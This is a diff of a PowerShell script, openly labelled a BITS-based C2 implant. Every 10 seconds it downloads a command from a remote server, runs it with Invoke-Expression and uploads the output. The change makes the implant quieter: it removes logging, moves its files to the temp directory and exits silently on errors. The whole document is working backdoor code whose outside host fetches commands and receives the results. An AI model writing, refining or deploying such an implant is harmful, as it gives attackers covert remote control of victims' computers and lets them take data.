@@ -1,64 +1,51 @@
-$C2Server = "http://192.168.12.128"
-$CommandFile = "/commands/command.json"
-$UploadFile = "/uploads/response.txt"
-$LocalCommandFile = "C:\Users\smail\Desktop\command.json"
-$LocalResultFile = "C:\Users\smail\Desktop\response.txt"
+$command_url = "http://192.168.16.130/commands/command.json"
+$upload_url = "http://192.168.16.130/uploads/response.txt"
+$local_command_file = "$Env:temp\command.json"
+$local_result_file = "$Env:temp\response.txt"
 
 function Download-Command {
-    Write-Output "[*] Downloading command file from $C2Server$CommandFile"
     try {
-        Start-BitsTransfer -Source "$C2Server$CommandFile" -Destination $LocalCommandFile -ErrorAction Stop
-        Write-Output "[+] Command file downloaded successfully."
+        Start-BitsTransfer -Source $command_url -Destination $local_command_file -ErrorAction Stop
     } catch {
-        Write-Output "[-] Failed to download command file: $_"
+        exit
     }
 }
 
 function Execute-Command {
-    if (Test-Path $LocalCommandFile) {
-        $CommandData = Get-Content $LocalCommandFile | ConvertFrom-Json
-        Write-Output "[*] Executing command: $($CommandData.command)"
+    if (Test-Path $local_command_file) {
+        $CommandData = Get-Content $local_command_file | ConvertFrom-Json
         try {
             $ExecutionResult = Invoke-Expression $CommandData.command 2>&1
-            Write-Output "[+] Command executed successfully."
-            # Save output to a local file
-            $ExecutionResult | Out-File -FilePath $LocalResultFile -Encoding utf8
+            $ExecutionResult | Out-File -FilePath $local_result_file -Encoding utf8
         } catch {
-            Write-Output "[-] Error during command execution: $_"
-            "Error: $_" | Out-File -FilePath $LocalResultFile -Encoding utf8
+            "Error: $_" | Out-File -FilePath $local_result_file -Encoding utf8
         }
     } else {
-        Write-Output "[-] Command file not found."
+        exit
     }
 }
 
 function Upload-Result {
-    if (Test-Path $LocalResultFile) {
-        Write-Output "[*] Uploading result to $C2Server$UploadFile"
+    if (Test-Path $local_result_file) {
         try {
-            Start-BitsTransfer -Source $LocalResultFile -Destination "$C2Server$UploadFile" -TransferType UploadReply -ErrorAction Stop
-            Write-Output "[+] Result uploaded successfully."
-            Remove-Item -Path $LocalResultFile -Force
+            Start-BitsTransfer -Source $local_result_file -Destination $upload_url -TransferType UploadReply -ErrorAction Stop
+            Remove-Item -Path $local_result_file -Force
         } catch {
-            Write-Output "[-] Failed to upload result: $_"
+            exit
         }
     } else {
-        Write-Output "[-] No result file to upload."
+        exit
     }
 }
 
 function Main-Loop {
     while ($true) {
-        Write-Output "[*] Starting new iteration..."
         Download-Command
         Execute-Command
         Upload-Result
-        del $LocalCommandFile
-        del $LocalResultFile
-        Start-Sleep -Seconds 30  # Wait 60 seconds before the next iteration
+        Remove-Item $local_command_file
+        Start-Sleep -Seconds 10
     }
 }
 
-# Start the implant
-Write-Output "[*] Starting BITS-based C2 implant..."
 Main-Loop
